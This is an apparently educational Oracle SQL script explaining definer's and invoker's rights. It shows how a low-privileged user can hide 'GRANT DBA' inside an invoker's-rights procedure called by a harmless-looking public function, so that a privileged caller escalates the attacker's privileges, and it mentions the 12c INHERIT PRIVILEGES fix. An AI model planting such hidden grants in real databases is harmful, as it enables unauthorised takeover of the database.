/* Oracle utilizes definers and invokers rights model when controlling access and
privileges necessary during the execution of user created program units (functions, procedures, views).

By default, without explicitly defining rights model when creating user units, these units are executed 
with definers rights (AUTHID DEFINER) model. This means unit will be executed with the rights and privileges of 
object owner and all external references (tables, views etc.) will be resolved based on object owner schema.

When unit is created with invoker's right model (AUTHID CURRENT_USER) unit is executed with rights and privileges
of the invoking user. In previous releases of Oracle db this could cause security holes when higher privileged user executed
invokers right program unit of a lower privileged user. 
*/

-- ORA1 is lower privileged user who can create invoker's right procedure which contains malicious code.
CREATE PROCEDURE my_new_proc AUTHID CURRENT_USER
AS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO ORA1';
    COMMIT;
EXCEPTION 
    WHEN OTHERS THEN NULL;
END;
/

-- When higher privileged executes it GRANT is given to lower privileged user.
CREATE FUNCTION return_date(param1 IN NUMBER)
RETURN DATE AUTHID CURRENT_USER
AS
BEGIN
    my_new_proc();
    RETURN sysdate + param1;
END;
/

GRANT EXECUTE ON return_date TO PUBLIC;

/*
From Oracle 12c new privilege 'INHERIT PRIVILEGES' was introduced to solve this problem as users can now control which
users will they grant inherit privilege privileges when executing their invokers rights program units.

GRANT INHERIT PRIVILEGES ON USER SYS TO ORA1;
REVOKE INHERIT PRIVILEGES ON USER SYS FROM ORA1;
*/